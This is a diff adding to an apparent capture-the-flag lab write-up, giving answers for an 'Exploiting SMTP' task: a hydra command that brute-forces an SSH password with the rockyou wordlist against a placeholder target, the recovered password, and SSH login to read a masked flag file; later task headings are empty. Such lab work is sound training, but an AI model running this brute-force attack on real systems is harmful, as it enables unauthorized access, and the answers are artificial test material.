@@ -193,3 +193,24 @@ Difficulty: Easy
 
 	- `administrator`
 
+## Task 7 - Exploiting SMTP
+
+- What is the password of the user we found during our enumeration stage?
+
+	- `hydra -t 16 -l USERNAME -P /usr/share/wordlists/rockyou.txt -vV <TARGET_IP> ssh`
+	- `alejandro`
+
+- Great! Now, let's SSH into the server as the user, what is contents of smtp.txt
+
+	- `ssh USERNAME@<TARGET_IP>`
+	- `cat smtp.txt`
+	- `******************************************`
+	
+## Task 8 - Understanding MySQL
+
+## Task 9 - Enumerating MySQL
+
+## Task 10 - Exploiting MySQL
+
+## Task 11 - Further Learning
+
